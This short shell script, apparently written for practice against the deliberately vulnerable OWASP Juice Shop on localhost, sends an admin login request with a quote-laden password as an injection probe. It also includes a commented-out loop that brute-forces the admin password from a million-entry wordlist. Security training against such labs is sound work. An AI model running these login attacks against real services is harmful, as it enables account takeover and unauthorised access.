#!/bin/sh


    payload="{\"email\":\"admin@juice-sh.op\",\"password\":\"pic\\'s\"}"
    curl -X POST http://localhost:3000/rest/user/login \
        -H "Content-Type: application/json" \
        -d "$payload" -s

# passwords="assets/01_passwords/1000000-password-seclists.txt"
# while read -r password; do
#     payload="{\"email\":\"admin@juice-sh.op\",\"password\":\"$password\"}"
#     echo "$payload"
#     response=$(curl -X POST http://localhost:3000/rest/user/login \
#         -H "Content-Type: application/json" \
#         -d "$payload" -s)
#     if ! echo "$response" | grep -q "Invalid"; then
#         echo "$password"
#         exit 0
#     fi
# done <"$passwords"
